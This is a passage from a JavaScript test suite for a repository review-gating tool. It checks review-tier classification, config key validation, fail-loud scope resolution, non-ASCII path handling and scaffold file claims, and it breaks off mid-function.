  // T6d, same child script: the measure runs only in the size branch, so a
  // critical verdict never calls it — case F's fixture through main() with changed_lines made to
  // raise. Red if the measure is hoisted above the tier chain; no tier line would show it.
  // This stays a child process: T6d replaces stdout and a module table of harness_gates, which the
  // runner of this suite must never do to itself.
  const t6cScript = path.join(fx, 'untracked_direct.mjs')
  fs.writeFileSync(t6cScript, P`import fs from 'node:fs'
import path from 'node:path'
import { pathToFileURL } from 'node:url'
const hg = await import(pathToFileURL(path.join(process.argv[2], 'harness_gates.mjs')).href)
const root = process.argv[3]
const crit = process.argv[4]
const fails = []
if (hg.changed_lines(root, null, null, []) === null) {
  fails.push('the numstat half failed on its own, so the unknown check below proves nothing')
}
if (hg.changed_lines(root, null, null, ['no-such-untracked.py']) !== null) {
  fails.push('an unreadable untracked path did not make the measure unknown')
}
const tgt = path.join(root, 't6c-target.txt')
fs.writeFileSync(tgt, Array.from({ length: 50 }, (_, i) => 'l' + i + '\n').join(''), 'utf8')
let skip = null
try {
  fs.symlinkSync(tgt, path.join(root, 't6c-link'))
  fs.symlinkSync(path.join(root, 't6c-missing'), path.join(root, 't6c-dangling'))
} catch (e) {
  skip = e.code === 'EPERM' || e.code === 'EACCES' ? 'PermissionError' : (e.code || e.name)
}
if (skip !== null) {
  console.log('T6c-SKIP-SYMLINK ' + skip)
} else {
  for (const name of ['t6c-link', 't6c-dangling']) {
    let n
    try {
      n = hg.added_lines(path.join(root, name))
    } catch (e) {
      n = e.name
    }
    if (n !== 1) fails.push(name + ' counted ' + n + ', not 1')
  }
}
console.log(fails.length ? 'T6c-FAIL: ' + fails.join('; ') : 'T6c-OK')
hg.ops.changed_lines = () => { throw new Error('changed_lines ran on a critical verdict') }
let captured = ''
const realWrite = process.stdout.write
const realErrWrite = process.stderr.write
process.stdout.write = (c) => { captured += String(c); return true }
process.stderr.write = () => true
let failure = null
try {
  hg.main(['--repo', crit])
} catch (e) {
  failure = e
} finally {
  process.stdout.write = realWrite
  process.stderr.write = realErrWrite
}
if (failure) console.log('T6d-FAIL: ' + failure.message)
else console.log(captured.includes('review tier: full — critical surface touched') ? 'T6d-OK' : 'T6d-FAIL: the fixture did not read critical')
`)
  const t6cRun = runNode([t6cScript, here, repoT6, repoF])
  const rT6c = t6cRun.stdout + t6cRun.stderr
  check('T6c an unreadable untracked path makes the measure unknown; a symlink counts 1 line', m(rT6c, 'T6c-OK'), rT6c)
  check('T6d a critical verdict never runs the line measure (it runs only in the size branch)', m(rT6c, 'T6d-OK'), rT6c)
  const t6cSkip = /T6c-SKIP-SYMLINK (\S+)/iu.exec(rT6c)
  if (t6cSkip) reg('T6c symlink', { skip: `this host refused os.symlink (${t6cSkip[1]}) — CI ubuntu runs this half` }, () => {})
  })
  section('U', [], async () => {
  // --- U: a script-gate declaration is checked key by key -------------------------------------------
  // An unknown key ("args": "--fast" — no argument field exists, ADR 0024 keeps flags inside the
  // script) must WARN, not vanish; a JSON-string "files" must not be truthy-coerced — bool("false")
  // is True, which would append the changed-file list to a script that declared the opposite.
  const CFG_KEYS = P`{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [
    { "name": "t", "match": "^t/", "cwd": "", "strip_prefix": "",
      "gates": [ { "runner": "pwsh", "script": "tools/ok.ps1", "files": "false", "args": "--fast", "//why": "comment keys stay silent" } ] }
  ]
}`
  const repoU = newRepo('script-gate-keys', CFG_KEYS, ['t/x.py', 'tools/ok.ps1'])
  const rU = await gates(repoU)
  const uRun = cmdLines(rU.Out)
  g('U an unknown script-gate key warns, naming the known set', m(rU.Out, P`unknown script-gate key 'args' ignored \(known: runner, script, files\)`), rU.Out)
  g('U a //-prefixed key is a comment, not a warning', nm(rU.Out, "unknown script-gate key '//why'"), rU.Out)
  g('U a string "files" warns and names the treatment', m(rU.Out, P`'files' must be a JSON boolean \(true/false\), got 'false' — treated as false \(whole-program\)`), rU.Out)
  g('U the string "false" is NOT truthy-coerced — no file list is appended', anyLine(uRun, P`pwsh -NoProfile -File tools/ok\.ps1\s+#`) && !anyLine(uRun, P`x\.py`), `lines: ${uRun.join(' | ')}`)
  g('U the gate itself is kept (a key defect degrades the key, never the gate)', m(rU.Out, 'whole-program: gate on slice files'), rU.Out)
  })
  section('V', [], async () => {
  // --- V: the two choke-point guarantees no CLI fixture can reach ---------------------------------
  // Both are second-layer defenses behind load-time scrubbing: every call path into token_ok()
  // strips first (so a trailing newline never arrives via the emitter), and safe_cwd() scrubs every
  // cwd before compose() sees it. The guarantee must not DEPEND on that, so this case imports the
  // module directly.
  {
    const fails = []
    if (hc.token_ok('a.py\n')) fails.push('token_ok accepted a trailing newline (the $-anchor admission)')
    if (!hc.token_ok('a.py')) fails.push('token_ok rejected a clean token')
    const w = []
    if (hc.compose(['echo', 'x'], 'bad dir', w) !== 'echo x') fails.push('a refused cwd still composed a cd')
    if (!w.some((x) => x.includes('refused at composition'))) fails.push('a refused cwd was dropped SILENTLY (no warn appended)')
    const w2 = []
    if (hc.compose(['echo', 'x'], 'sub/dir', w2) !== 'cd sub/dir && echo x' || w2.length) fails.push('a clean cwd mis-composed or spuriously warned')
    if (hc.compose(['echo', 'x'], 'bad dir') !== 'echo x') fails.push('the warns-less call changed behavior')
    // CONTROL's class pinned to EXPECTED code points over every UTF-16 code unit, as hook-lib.selftest pins
    // inline() and report-issue.selftest I1 pins its import: C0, DEL, NEL, U+2028, U+2029 (no backtick here).
    const want = new Set([...Array(0x20).keys(), 0x7f, 0x85, 0x2028, 0x2029])
    const got = new Set()
    for (let c = 0; c < 0x10000; c++) if (hc.CONTROL.test(String.fromCharCode(c))) got.add(c)
    const minus = (a, b) => [...a].filter((x) => !b.has(x)).sort((x, y) => x - y)
    const hex = (c) => `U+${c.toString(16).toUpperCase().padStart(4, '0')}`
    if (minus(want, got).length || minus(got, want).length) {
      fails.push(`CONTROL off its class: missing ${minus(want, got).map(hex).join(',')} extra ${minus(got, want).slice(0, 8).map(hex).join(',')}`)
    }
    g('V token_ok refuses a trailing newline; compose warns on a refused cwd (never silent); CONTROL is exactly its class', fails.length === 0, `V-FAIL: ${fails.join('; ')}`)
  }
  })
  section('W', [], async () => {
  // --- W: derived-copy exemption (ADR 0037) — byte-identical placements stop counting -------------
  // The exemption is exactly as wide as verified identity: an identical copy leaves the size
  // measure and cannot force critical (the source's classification decides); a DRIFTED copy counts
  // fully. Both narrowings must be stated on the tier line.
  CFG_DER = P`{
  "review": {
    "canon": "REVIEW.md",
    "docs_only": ["^docs/"],
    "harness_layer": [],
    "critical": ["^placed/"],
    "derived": [ { "source": "src/", "copies": ["placed/"] } ]
  },
  "groups": []
}`
  })
  section('W1', ['W'], async () => {
  // W1: identical copy — critical suppressed, size counts the source only.
  const repoW1 = newRepo('derived-identical', CFG_DER, ['src/tool.py', 'placed/tool.py'])
  const rW1 = await gates(repoW1)
  check('W1 identical derived copy cannot force critical (tier small)', m(rW1.Out, 'review tier: small'), rW1.Out)
  check('W1 the suppression is stated on the tier line', m(rW1.Out, P`1 critical match\(es\) on byte-identical derived copies not counted — criticality follows the source`), rW1.Out)
  check('W1 the copy leaves the size measure, stated', m(rW1.Out, '1 byte-identical derived copy excluded from the size measure, still in review scope'), rW1.Out)
  })
  section('W2', ['W'], async () => {
  // W2: drift — identity is verified, never assumed: a diverged copy keeps its critical match.
  const repoW2 = newRepo('derived-drift', CFG_DER, ['src/tool.py', 'placed/tool.py'])
  put(repoW2, 'placed/tool.py', 'DRIFTED')
  const rW2 = await gates(repoW2)
  check('W2 a drifted copy keeps its critical match (tier full)', m(rW2.Out, P`review tier: full — critical surface touched \(placed/tool\.py`), rW2.Out)
  check('W2 no suppression is claimed', nm(rW2.Out, 'criticality follows the source'), rW2.Out)
  })
  section('W3', ['W'], async () => {
  // W3: propagation-only diff — the source landed earlier; the copy alone changes, identical to
  // the committed source. Counted set is empty -> small, never skip (ADR 0037: the exemption
  // narrows measure and attribution, not the trust class).
  const repoW3 = newRepo('derived-prop', CFG_DER, [])
  put(repoW3, 'src/tool.py', 'x')
  fixtureCommit(repoW3, 'src')
  put(repoW3, 'placed/tool.py', 'x')
  const rW3 = await gates(repoW3)
  check('W3 a propagation-only diff earns small on an empty counted set', m(rW3.Out, P`review tier: small — 0 counted file\(s\) / 0 counted line\(s\), no critical surface`), rW3.Out)
  check('W3 never skip', nm(rW3.Out, 'review tier: skip'), rW3.Out)
  })
  section('W4', ['W'], async () => {
  // W4: an invalid mapping (prefix without the trailing '/') is dropped with a warning, so the
  // copy's critical match stands — a broken declaration must fail toward the stronger tier.
  const CFG_DER_BAD = rep(CFG_DER, '"source": "src/"', '"source": "src"')
  const repoW4 = newRepo('derived-bad', CFG_DER_BAD, ['src/tool.py', 'placed/tool.py'])
  const rW4 = await gates(repoW4)
  check('W4 an invalid derived entry warns and is ignored', m(rW4.Out, "review\\.derived\\[0\\].*must be path PREFIXES ending in '/'") && m(rW4.Out, 'refused: src'), rW4.Out)
  check('W4 the dropped mapping buys no exemption (tier full via critical)', m(rW4.Out, P`review tier: full — critical surface touched \(placed/tool\.py`), rW4.Out)
  })
  section('X', [], async () => {
  // --- X: declaration criticality computed from changed keys (ADR 0038) ---------------------------
  // {docs, handoff, artifacts} and comments feed reporting only; everything else is critical in
  // every repo, declared or not — the declaration cannot opt itself out.
  CFG_X = P`{
  "//note": "a",
  "handoff": "",
  "review": {
    "canon": "REVIEW.md",
    "docs_only": ["^docs/"],
    "harness_layer": [],
    "critical": ["^\\.harness\\.json$"]
  },
  "groups": []
}`
  })
  section('X1', ['X'], async () => {
  // X1: metadata-only edit in a repo that DECLARED the file critical — refined to the size tier.
  const repoX1 = newRepo('decl-meta', CFG_X, [])
  edit(repoX1, '.harness.json', '"handoff": ""', '"handoff": "HANDOFF.md"')
  const rX1 = await gates(repoX1)
  check('X1 a metadata-only declaration edit does not force critical', m(rX1.Out, 'review tier: small') && nm(rX1.Out, 'critical surface touched'), rX1.Out)
  check('X1 the refinement names its keys', m(rX1.Out, P`declaration change confined to metadata keys \(handoff\) — not counted as critical`), rX1.Out)
  })
  section('X2', ['X'], async () => {
  // X2: a non-metadata key changes in a repo that NEVER declared the file critical — forced full.
  const CFG_X2 = rep(CFG_X, P`"critical": ["^\\.harness\\.json$"]`, '"critical": []')
  const repoX2 = newRepo('decl-groups', CFG_X2, [])
  edit(repoX2, '.harness.json', '"groups": []', '"groups": [ { "name": "g", "match": "^g/", "cwd": "", "strip_prefix": "", "gates": [] } ]')
  const rX2 = await gates(repoX2)
  check('X2 a groups change is critical even undeclared', m(rX2.Out, P`review tier: full — critical surface touched \(\.harness\.json`), rX2.Out)
  check('X2 the forcing names its keys', m(rX2.Out, P`declaration keys changed \(groups\) — the declaration decides what runs and what gets reviewed, so it is critical in every repo`), rX2.Out)
  })
  section('X3', ['X'], async () => {
  // X3: a comment-only edit compares equal after comment stripping — never critical.
  const repoX3 = newRepo('decl-comment', CFG_X, [])
  edit(repoX3, '.harness.json', '"//note": "a"', '"//note": "b"')
  const rX3 = await gates(repoX3)
  check('X3 a comment-only declaration edit is named and not critical', m(rX3.Out, 'declaration change is comment-only — not counted as critical') && nm(rX3.Out, 'critical surface touched'), rX3.Out)
  })
  section('X5', ['X'], async () => {
  // X5: explicit-files mode ignores --range for the declaration base too (the contract
  // print_scope announces): the base is HEAD, so a bogus range must not flip a metadata edit to
  // undetermined/critical (the guard changed_lines already has).
  const repoX5 = newRepo('decl-explicit', CFG_X, [])
  edit(repoX5, '.harness.json', '"handoff": ""', '"handoff": "HANDOFF.md"')
  const rX5 = await gates(repoX5, ['--range', 'deadbeef..HEAD', '.harness.json'])
  check('X5 explicit files ignore --range for the declaration base too', m(rX5.Out, P`declaration change confined to metadata keys \(handoff\)`) && nm(rX5.Out, 'undetermined'), rX5.Out)
  })
  section('X4', [], async () => {
  // X4: a NEWLY ADDED declaration has no base to diff against — undetermined is critical, never
  // safe (adopting the file that decides what runs deserves the strongest first review).
  const repoX4 = newRepo('decl-new', '', [])
  put(repoX4, '.harness.json', '{ "groups": [] }')
  const rX4 = await gates(repoX4)
  check('X4 a newly added declaration is critical (undetermined base)', m(rX4.Out, P`review tier: full — critical surface touched \(\.harness\.json`) && m(rX4.Out, P`declaration keys changed \(undetermined\)`), rX4.Out)
  })
  section('X6', ['X'], async () => {
  // X6: `artifacts` is not in the safe set (ADR 0068) — items[].check composes a command CI runs, so
  // an artifacts edit forces critical (over-approximate for a title typo, erring toward
  // critical). This case is the mutation anchor for putting the key into the safe set by mistake.
  const repoX6 = newRepo('decl-artifacts', CFG_X, [])
  edit(repoX6, '.harness.json', '"handoff": ""', '"handoff": "", "artifacts": { "readme": "README.md", "items": [] }')
  const rX6 = await gates(repoX6)
  check('X6 an artifacts change is critical since ADR 0068 (check reaches command composition)', m(rX6.Out, P`declaration keys changed \(artifacts\)`) && m(rX6.Out, P`review tier: full — critical surface touched \(\.harness\.json`), rX6.Out)
  })
  section('X7', ['X'], async () => {
  // X7: `docs` is a safe key, but `docs.customer.panels[].module` names a .py file the docs builder
  // IMPORTS and CI runs (ADR 0060) — so a change confined to that sub-path is reported as its own
  // dotted key and the safe-set test fails on it: critical, though the top-level key is `docs`
  // (ADR 0110). Mutation anchor: DECL_UNSAFE_SUBPATHS = () turns X7 red and leaves X8 green.
  CFG_X7 = rep(CFG_X, '"handoff": ""', '"handoff": "", "docs": { "site_title": "T", "customer": { "panels": [ { "module": "a.py" } ] } }')
  const repoX7 = newRepo('decl-panels', CFG_X7, [])
  edit(repoX7, '.harness.json', '"module": "a.py"', '"module": "b.py"')
  const rX7 = await gates(repoX7)
  check('X7 a docs.customer.panels-only change names the dotted key', m(rX7.Out, P`declaration keys changed \(docs, docs\.customer\.panels\)`), rX7.Out)
  check('X7 and forces critical on .harness.json', m(rX7.Out, P`review tier: full — critical surface touched \(\.harness\.json`) && nm(rX7.Out, 'confined to metadata keys'), rX7.Out)
  })
  section('X8', ['X7'], async () => {
  // X8: the control — another `docs` field alone stays metadata (the sub-path test must not widen `docs`).
  const repoX8 = newRepo('decl-docs-title', CFG_X7, [])
  edit(repoX8, '.harness.json', '"site_title": "T"', '"site_title": "U"')
  const rX8 = await gates(repoX8)
  check('X8 a docs.site_title-only change is still confined to metadata keys',
    m(rX8.Out, P`declaration change confined to metadata keys \(docs\) — not counted as critical`) && nm(rX8.Out, 'critical surface touched') && nm(rX8.Out, 'declaration keys changed'), rX8.Out)
  })
  section('H#2', [], async () => {
  // --- H: handoff declaration forms (ADR 0040) ----------------------------------------------------
  // A trailing '/' declares a per-work-line directory and the emitter must say so — the slice-close
  // instruction is "update the handoff the emitter named", so the form has to be visible where it
  // is read. The file form stays byte-stable: no annotation.
  const CFG_H = P`{
  "handoff": "docs/handoff/",
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": []
}`
  const repoH1 = newRepo('handoff-dir', CFG_H, ['src/tool.py'])
  const rH1 = await gates(repoH1)
  check('H1 a trailing-slash handoff is annotated as a per-work-line directory', m(rH1.Out, 'handoff: docs/handoff/ — directory: one resume file per work line'), rH1.Out)

  const repoH2 = newRepo('handoff-file', rep(CFG_H, '"handoff": "docs/handoff/"', '"handoff": "SESSION_HANDOFF.md"'), ['src/tool.py'])
  const rH2 = await gates(repoH2)
  check('H2 a file-form handoff line carries no directory annotation', m(rH2.Out, P`handoff: SESSION_HANDOFF\.md`) && nm(rH2.Out, 'one resume file per work line'), rH2.Out)
  })
  section('Y', [], async () => {
  // --- Y: fail-loud scope + full-tree audit (ADR 0041) ---------------------------------------------
  })
  section('Y1', [], async () => {
  // Y1: a git failure inside scope resolution must not print one stderr line and exit 0 with EMPTY
  // stdout — no ungrouped marker, no artifact line, no gate commands — because every grep-shaped CI
  // step reads that silence as green. The contract: stdout marker + non-zero exit, and NOTHING below
  // the marker is computed. Reverting the except-branch to `return 0` turns both assertions red.
  repoY1 = newRepo('scope-fail', CFG, ['api/app.py'])
  const rY1 = await gates(repoY1, ['--range', 'no-such-ref..HEAD'])
  check('Y1 an unresolvable range exits non-zero (the one non-advisory exit)', rY1.Code !== 0, `exit=${rY1.Code} out=${rY1.Out}`)
  check('Y1 the failure is a stdout marker, not only stderr', m(rY1.Out, 'scope: FAILED — git could not resolve') && m(rY1.Out, 'must not be read as a pass'), rY1.Out)
  check('Y1 nothing below the marker is computed (no gates window, no tier)', nm(rY1.Out, '(?m)^gates:') && nm(rY1.Out, 'review tier:'), rY1.Out)
  // The stderr diagnostic must be LEGIBLE git text, never a bytes-repr (`b'...'`): a decode that covers
  // only the success path would pass every other case while garbling the one line that exists to be read.
  check('Y1 the stderr diagnostic is legible text, not bytes-repr', m(rY1.Out, 'git failed: fatal') && nm(rY1.Out, "git failed: b'"), rY1.Out)
  })
  section('Y2', ['Y1'], async () => {
  // Y2: verify_map shares the scope path and the same contract (its silence would read as "nothing to
  // verify" to the /verify skill). It reads the docs index BEFORE resolving scope — an unreadable
  // index returns first with `index: FAILED` and exit 1 (ADR 0110), an absent one with `index:
  // ABSENT` and exit 0 — so the fixture needs a minimal valid index for the run to reach the scope
  // path at all.
  put(repoY1, 'docs/index.json', '{"spec": []}')
  const vmap = path.join(here, 'verify_map.mjs')
  const rY2 = runNode([vmap, '--repo', repoY1, '--range', 'no-such-ref..HEAD'])
  const rY2out = rY2.stdout + rY2.stderr
  check('Y2 verify_map fails loudly on an unresolvable range too', rY2.status !== 0 && m(rY2out, 'scope: FAILED'), `exit=${rY2.status} out=${rY2out}`)
  })
  section('Y3', [], async () => {
  // Y3: --all audits the FULL TREE (ADR 0041) — files nowhere near any diff are classified: two
  // individually green PRs compose a main state no ranged run ever saw, and partition is a tree
  // property. seed.txt is tracked, committed, unchanged — a ranged or worktree run never lists
  // it; --all must, and must report it ungrouped.
  repoY3 = newRepo('all-audit', CFG, ['api/app.py'])
  const rY3 = await gates(repoY3, ['--all'])
  check('Y3 --all exits 0', rY3.Code === 0, `exit=${rY3.Code}`)
  check('Y3 the scope line names the full tree with both counts', m(rY3.Out, P`scope: full tree — tracked \d+ · untracked \d+ = \d+ unique file\(s\) \(--all\)`), rY3.Out)
  check('Y3 a committed unchanged file is in scope and reported ungrouped', m(rY3.Out, P`ungrouped \(`) && m(rY3.Out, P`seed\.txt`), rY3.Out)
  check('Y3 gates still compose over matching files', m(rY3.Out, P`uv run ruff check app\.py`), rY3.Out)
  check('Y3 the tier line is the audit form, keeping the parser sentinel prefix', m(rY3.Out, '(?m)^review tier: full-tree audit — a tier applies to a slice'), rY3.Out)
  check('Y3 no per-slice tier wording leaks into audit mode', nm(rY3.Out, 'review tier: (skip|small|full) '), rY3.Out)
  })
  section('Y4', ['Y3'], async () => {
  // Y4: --all with --range or files — --all wins and says so on stderr (a mixed invocation must
  // not silently half-apply).
  const rY4 = await gates(repoY3, ['--all', '--range', 'HEAD~1..HEAD'])
  check('Y4 --all overrides --range with a stderr note', m(rY4.Out, '--all given — ignoring --range') && m(rY4.Out, 'scope: full tree'), rY4.Out)
  })
  section('Y5', [], async () => {
  // Y5: an unborn HEAD (git init && git add, no commit yet) is a NORMAL state, not the fail-loud
  // class — the ADR 0041 exception must not fire on it. The honest scope is staged+unstaged vs the empty tree, reported not failed; a fresh
  // scaffold's very first emitter run is this state.
  const repoY5 = path.join(fx, 'unborn-head')
  put(repoY5, '.harness.json', CFG)
  put(repoY5, 'api/app.py', 'x')
  gitq(repoY5, ['init', '-q'])
  gitq(repoY5, ['add', '-A'])
  const rY5 = await gates(repoY5)
  check('Y5 unborn HEAD exits 0 — a fresh repo is not a scope failure', rY5.Code === 0, `exit=${rY5.Code} out=${rY5.Out}`)
  check('Y5 the staged file is in scope and gated', m(rY5.Out, P`uv run ruff check app\.py`), rY5.Out)
  check('Y5 the unborn state is reported, not silent', m(rY5.Out, 'unborn HEAD'), rY5.Out)
  check('Y5 no scope-FAILED marker fires', nm(rY5.Out, 'scope: FAILED'), rY5.Out)
  })
  section('Y5b', [], async () => {
  // Y5b: the tier stays full, and its reason names the missing commit — not a measurement fault. Y5's own
  // staged `.harness.json` makes it critical, so the size branch needs a repo with no declaration.
  const repoY5b = path.join(fx, 'unborn-head-size')
  put(repoY5b, 'api/app.py', 'x')
  gitq(repoY5b, ['init', '-q'])
  gitq(repoY5b, ['add', '-A'])
  const rY5b = await gates(repoY5b)
  check('Y5b the unborn tier is full and its reason says there is no commit to count against', m(rY5b.Out, P`review tier: full — no commit yet \(unborn HEAD\)`) && nm(rY5b.Out, 'could not be measured'), rY5b.Out)
  })
  section('Y6', [], async () => {
  // Y6: --all on an empty tree still prints the trailer facts — review-canon existence (and hooks
  // wiring where .githooks/ exists) are TREE facts a full-tree audit exists to report, so the
  // empty-scope early return must not skip them.
  const repoY6 = path.join(fx, 'all-empty')
  fs.mkdirSync(repoY6, { recursive: true })
  gitq(repoY6, ['init', '-q'])
  const rY6 = await gates(repoY6, ['--all'])
  check('Y6 --all on an empty tree exits 0 and still prints the trailer facts', rY6.Code === 0 && m(rY6.Out, 'review canon:'), `exit=${rY6.Code} out=${rY6.Out}`)
  })
  section('Y7', [], async () => {
  // Y7: non-ASCII paths survive scope resolution VERBATIM (spec 0007 §4). git's default
  // core.quotepath=true octal-escapes any non-ASCII path (`"docs/AWS \354..."`), no anchored group
  // pattern matches the quoted form, and every such file reads as ungrouped — exactly in CI, whose
  // fresh checkout carries no local quotepath override (dev clones usually do). The fixture pins
  // quotepath=true repo-locally to reproduce the CI default on any machine; `-c core.quotepath=false`
  // in git_lines overrides repo config, so reverting it turns Y7 red. Two files on purpose: the grouped
  // one is the regression, the ungrouped one is NAMED in output and proves the path arrives raw
  // end-to-end (git → UTF-8 decode → report), not merely regrouped.
  const cfgY7 = '{ "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] }, "groups": [ { "name": "docs", "match": "^docs/", "cwd": "", "strip_prefix": "", "gates": [] } ] }'
  const repoY7 = newRepo('quotepath', cfgY7, [])
  for (const f of ['docs/AWS 조직통합_경영보고.html', '메모.rb']) put(repoY7, f, 'x')
  gitq(repoY7, ['config', 'core.quotepath', 'true'])
  fixtureCommit(repoY7, 'non-ascii paths')
  const rY7 = await gates(repoY7, ['--all'])
  check('Y7 --all exits 0 with non-ASCII tracked paths', rY7.Code === 0, `exit=${rY7.Code} out=${rY7.Out}`)
  check('Y7 the non-ASCII file is claimed by its group, not ungrouped', m(rY7.Out, P`\[docs\] 1 file`), rY7.Out)
  check('Y7 the ungrouped non-ASCII file is named VERBATIM', m(rY7.Out, P`ungrouped \(2 file`) && rY7.Out.includes('메모.rb') && m(rY7.Out, P`seed\.txt`), rY7.Out)
  check('Y7 no octal-escaped or C-quoted path anywhere in the report', nm(rY7.Out, P`\\\d{3}`) && nm(rY7.Out, '"docs/'), rY7.Out)
  })
  section('Y8', [], async () => {
  // Y8: a path carrying U+2028 stays ONE path (ADR 0077). git prints it raw under
  // quotepath=false, and a split on Unicode line breaks would break it into `docs/a` + `b.md` — the
  // second half is ungrouped, so a docs-only file would fail the partition. `git_paths`
  // (-z, NUL split) keeps it whole. The separator is built at runtime from its code point, never a literal in this
  // file (a literal U+2028 escape can materialize as the character itself). Both scope shapes are
  // exercised: --all (ls-files) and the default worktree scope (diff --name-only / ls-files --others).
  const ls = String.fromCharCode(0x2028)
  const cfgY8 = '{ "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] }, "groups": [ { "name": "docs", "match": "^docs/", "cwd": "", "strip_prefix": "", "gates": [] } ] }'
  const repoY8 = newRepo('line-sep-path', cfgY8, [])
  put(repoY8, `docs/a${ls}b.md`, 'x')
  const rY8u = await gates(repoY8)
  fixtureCommit(repoY8, 'line-separator path')
  const rY8 = await gates(repoY8, ['--all'])
  check('Y8 --all: a U+2028 path is ONE docs file, nothing ungrouped but the seed', m(rY8.Out, P`\[docs\] 1 file`) && nm(rY8.Out, P`(?m)^\s*b\.md\s*$`), rY8.Out)
  check('Y8 worktree scope: the untracked U+2028 path is ONE docs file', m(rY8u.Out, P`\[docs\] 1 file`) && nm(rY8u.Out, 'ungrouped'), rY8u.Out)
  })
  section('Z', [], async () => {
  // --- Z: built-in scaffold claims (ADR 0044) ------------------------------------------------------
  })
  section('Z1', [], async () => {
  // Z1: a scaffold-placed path no declared group matches is claimed built-in and REPORTED with its
  // name; a genuinely foreign file still fails the partition alone. Mutation anchors: dropping the
  // built-in claim moves .harness-version into ungrouped (the 1-file count fails); dropping the
  // report block fails the scaffold-claimed match while the count assertion still holds — each
  // half of the mechanism fails a distinct assertion.
  repoZ1 = newRepo('scaffold-claim', CFG, ['.harness-version', 'weird/thing.rb'])
  const rZ1 = await gates(repoZ1)
  check('Z1 scaffold path claimed built-in, reported with the ADR', m(rZ1.Out, P`scaffold-claimed \(1 file\(s\)`) && m(rZ1.Out, 'ADR 0044'), rZ1.Out)
  check('Z1 the claimed path is NAMED on a 2-space line (parser-inert shape)', m(rZ1.Out, P`(?m)^  \.harness-version\s*$`), rZ1.Out)
  check('Z1 the header sits at column 0 and never at command depth', m(rZ1.Out, P`(?m)^scaffold-claimed \(`) && nm(rZ1.Out, P`(?m)^    \.harness-version`), rZ1.Out)
  check('Z1 the foreign file still fails the partition alone', m(rZ1.Out, P`ungrouped \(1 file`) && m(rZ1.Out, P`weird/thing\.rb`), rZ1.Out)
  })
  section('Z2', [], async () => {
  // Z2: a declared group WINS over the built-in claim — the set consumes leftovers only, so a repo
  // that already claims a scaffold path (every older scaffolded repo does) changes nothing.
  const metaCfg = P`{ "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] }, "groups": [ { "name": "meta", "match": "^\\.harness-version$", "cwd": "", "strip_prefix": "", "gates": [] } ] }`
  const repoZ2 = newRepo('scaffold-claim-declared', metaCfg, ['.harness-version'])
  const rZ2 = await gates(repoZ2)
  check('Z2 a declared group WINS over the built-in claim', m(rZ2.Out, P`\[meta\] 1 file`) && nm(rZ2.Out, 'scaffold-claimed'), rZ2.Out)
  })
  section('Z5', [], async () => {
  // Z5: a path that an older scaffold placed and the current one retired stays claimed built-in, so a repo
  // that still tracks it passes its partition audit (ywr-harness ADR 0215). Mutation anchor: dropping the
  // retired set moves both paths into ungrouped.
  const repoZ5 = newRepo('scaffold-claim-retired', CFG, ['.githooks/commit-msg', 'docs/prompts/review-digest.md'])
  const rZ5 = await gates(repoZ5)
  check('Z5 retired scaffold paths stay claimed built-in, nothing ungrouped',
    m(rZ5.Out, P`scaffold-claimed \(2 file\(s\)`) && m(rZ5.Out, P`(?m)^  \.githooks/commit-msg\s*$`) && m(rZ5.Out, P`(?m)^  docs/prompts/review-digest\.md\s*$`) && nm(rZ5.Out, P`ungrouped \(`), rZ5.Out)
  })
  section('Z3', ['Z1'], async () => {
  // Z3: the claim composes with --all (CI's push-run partition audit is where a missing claim
  // would fail): the tracked, unchanged .harness.json is in the full-tree scope, claimed
  // built-in, and only the repo's own files stay ungrouped.
  const rZ3 = await gates(repoZ1, ['--all'])
  check('Z3 --all claims scaffold paths built-in too', m(rZ3.Out, P`scaffold-claimed \(2 file\(s\)`) && m(rZ3.Out, P`(?m)^  \.harness\.json\s*$`), rZ3.Out)
  check("Z3 --all still fails the partition on the repo's own files", m(rZ3.Out, P`ungrouped \(`) && m(rZ3.Out, P`weird/thing\.rb`), rZ3.Out)
  })
  section('Z4', [], async () => {
  // Z4: THE PAIRING GATE — harness_config.SCAFFOLD_CLAIMS must equal the placement.mjs tables'
  // destinations plus the generated .harness-version stamp, in BOTH directions (ADR 0044's
  // accepted second copy; the fm_digest pairing shape). The tables are IMPORTED, never
  // re-read as text, and the read is STRICT: a table that is not a non-empty list of [source,
  // destination] string pairs fails this case loudly rather than degrading to a fragment (a
  // fragment in the map is a wrong path compared quietly). Scope, stated so this is
  // never read wider than it checks: the pairing covers the DESTINATION
  // axis only — the only axis SCAFFOLD_CLAIMS carries. A template SOURCE-key rename with the same
  // destination, or a GUARD_MARKER change, passes here by design; both are irrelevant to claims.
  const placementPath = path.resolve(here, '../skills/harness-init/placement.mjs')
  const zDests = []
  let zExtractOk = false
  let zExtractWhy = ''
  try {
    const pl = await import(pathToFileURL(placementPath).href)
    // The JSON round trip reads each table as plain JSON, so a table that is no list reads as no list.
    const tables = JSON.parse(JSON.stringify({ TOOLCHAIN: pl.TOOLCHAIN, GUARDED: pl.GUARDED, SEED: pl.SEED, SEED_CORPUS: pl.SEED_CORPUS }))
    zExtractOk = true
    for (const name of ['TOOLCHAIN', 'GUARDED', 'SEED', 'SEED_CORPUS']) {
      const v = tables[name]
      const list = Array.isArray(v) ? v : (v === undefined || v === null ? [] : [v])
      if (!list.length) { zExtractOk = false; zExtractWhy = `${name} is empty or missing`; break }
      for (const e of list) {
        const pair = Array.isArray(e) ? e : [e]
        if (pair.length !== 2 || typeof pair[0] !== 'string' || typeof pair[1] !== 'string' || !pair[0] || !pair[1]) { zExtractOk = false; zExtractWhy = `${name} holds a malformed entry`; break }
        zDests.push(pair[1])
      }
      if (!zExtractOk) break
    }
  } catch (e) { zExtractWhy = `the import failed: ${e.message}` }
  check('Z4 placement.mjs tables extract whole (strict — no fragments)', zExtractOk, `the placement tables moved or malformed (${zExtractWhy}) — fix the module, and keep SCAFFOLD_CLAIMS paired`)
  if (zExtractOk) {
    const uniq = (xs) => [...new Map(xs.map((x) => [x.toLowerCase(), x])).values()].sort()
    const zExpected = uniq([...zDests, '.harness-version'])
    const zActual = [...hc.SCAFFOLD_CLAIMS].map((x) => String(x).trim()).filter(Boolean).sort()
    const has = (xs, x) => xs.some((y) => y.toLowerCase() === x.toLowerCase())
    const zMissing = zExpected.filter((x) => !has(zActual, x))
